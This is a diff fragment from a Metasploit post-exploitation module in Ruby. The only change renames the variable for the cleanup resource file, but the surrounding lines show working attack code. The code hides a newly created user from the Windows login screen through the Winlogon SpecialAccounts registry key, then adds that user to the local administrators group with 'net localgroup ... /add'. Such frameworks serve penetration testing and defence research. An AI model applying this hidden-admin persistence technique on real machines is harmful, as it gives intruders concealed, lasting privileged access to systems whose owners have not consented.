@@ -138,7 +138,7 @@ class Metasploit3 < Msf::Post
         print_status "\tHiding user from Windows Login screen"
         hide_user_key = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList'
         registry_setvaldata(hide_user_key,username,0,"REG_DWORD")
-        file_local_write(@dest,"reg deleteval -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\ NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList -v #{username}")
+        file_local_write(cleanup_rc,"reg deleteval -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\ NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList -v #{username}")
         print_status "\tAdding User: #{username} to local group '#{admin}'"
         cmd_exec("cmd.exe","/c net localgroup #{admin}  #{username} /add")
         print_status "You can now login with the created user"
